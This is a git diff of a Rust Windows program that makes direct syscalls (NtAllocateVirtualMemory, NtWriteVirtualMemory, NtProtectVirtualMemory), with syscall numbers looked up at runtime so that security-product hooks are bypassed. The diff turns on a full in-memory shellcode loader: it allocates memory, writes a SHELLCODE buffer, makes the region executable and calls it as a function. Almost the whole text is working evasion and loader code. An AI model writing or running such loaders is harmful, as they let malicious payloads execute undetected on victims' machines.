@@ -47,9 +47,13 @@ unsafe extern "win64" {
     ) -> i32;
 }
 
+unsafe extern "C" {
+    static mut SSN: u32;
+}
+
 global_asm!(
     "
-    .data
+    .section .data
     SSN: .word 0
 
     .section .text
@@ -57,19 +61,19 @@ global_asm!(
 
     Sys_NtAllocateVirtualMemory:
         mov r10, rcx
-        mov rax, 0x18
+        mov rax, [rip + SSN]
         syscall
         ret
     
     Sys_NtWriteVirtualMemory:
         mov r10, rcx
-        mov rax, 0x3A
+        mov rax, [rip + SSN]
         syscall
         ret
 
     Sys_NtProtectVirtualMemory:
         mov r10, rcx
-        mov rax, 0x50
+        mov rax, [rip + SSN]
         syscall
         ret
     "
@@ -221,60 +225,66 @@ fn get_ssn(func_name: &str) -> u32 {
 
 fn main() {
     unsafe {
+        let mut base_address: *mut _ = null_mut();
+        let mut size = SHELLCODE.len();
         let ssn = get_ssn("NtAllocateVirtualMemory");
         println!("[+] NtAllocateVirtualMemory SSN: 0x{:X}", ssn);
+        SSN = ssn;
+        let status = Sys_NtAllocateVirtualMemory(
+            NtCurrentProcess,
+            &mut base_address,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
 
-        // let mut base_address: *mut _ = null_mut();
-        // let mut size = SHELLCODE.len();
-        // let status = Sys_NtAllocateVirtualMemory(
-        //     NtCurrentProcess,
-        //     &mut base_address,
-        //     0,
-        //     &mut size,
-        //     MEM_COMMIT | MEM_RESERVE,
-        //     PAGE_READWRITE,
-        // );
+        if status != 0 {
+            println!("[-] Failed to allocate memory: 0x{:X}", status);
+            return;
+        }
 
-        // if status != 0 {
-        //     println!("[-] Failed to allocate memory: 0x{:X}", status);
-        //     return;
-        // }
+        println!("[+] Allocated {} bytes at {:p}", size, base_address);
 
-        // println!("[+] Allocated {} bytes at {:p}", size, base_address);
+        let mut bytes_written = 0;
+        let ssn = get_ssn("NtWriteVirtualMemory");
+        println!("[+] NtWriteVirtualMemory SSN: 0x{:X}", ssn);
+        SSN = ssn;
+        let status = Sys_NtWriteVirtualMemory(
+            NtCurrentProcess,
+            base_address,
+            SHELLCODE.as_ptr() as *mut c_void,
+            SHELLCODE.len(),
+            &mut bytes_written,
+        );
 
-        // let mut bytes_written = 0;
-        // let status = Sys_NtWriteVirtualMemory(
-        //     NtCurrentProcess,
-        //     base_address,
-        //     SHELLCODE.as_ptr() as *mut c_void,
-        //     SHELLCODE.len(),
-        //     &mut bytes_written,
-        // );
+        if status != 0 {
+            println!("[-] Failed to write shellcode: 0x{:X}", status);
+            return;
+        }
 
-        // if status != 0 {
-        //     println!("[-] Failed to write shellcode: 0x{:X}", status);
-        //     return;
-        // }
+        println!("[+] Wrote {} bytes of shellcode", bytes_written);
 
-        // println!("[+] Wrote {} bytes of shellcode", bytes_written);
+        let ssn = get_ssn("NtProtectVirtualMemory");
+        println!("[+] NtProtectVirtualMemory SSN: 0x{:X}", ssn);
+        SSN = ssn;
+        let mut old_protect: u32 = 0;
+        let status = Sys_NtProtectVirtualMemory(
+            NtCurrentProcess,
+            &mut base_address,
+            &mut size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
 
-        // let mut old_protect: u32 = 0;
-        // let status = Sys_NtProtectVirtualMemory(
-        //     NtCurrentProcess,
-        //     &mut base_address,
-        //     &mut size,
-        //     PAGE_EXECUTE_READ,
-        //     &mut old_protect,
-        // );
+        if status != 0 {
+            println!("[-] Failed to change memory protection: 0x{:X}", status);
+            return;
+        }
 
-        // if status != 0 {
-        //     println!("[-] Failed to change memory protection: 0x{:X}", status);
-        //     return;
-        // }
-
-        // let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
-        // println!("[+] Executing shellcode...");
-        // shellcode_fn();
+        let shellcode_fn: ShellcodeFn = std::mem::transmute(base_address);
+        println!("[+] Executing shellcode...");
+        shellcode_fn();
 
         return;
     }
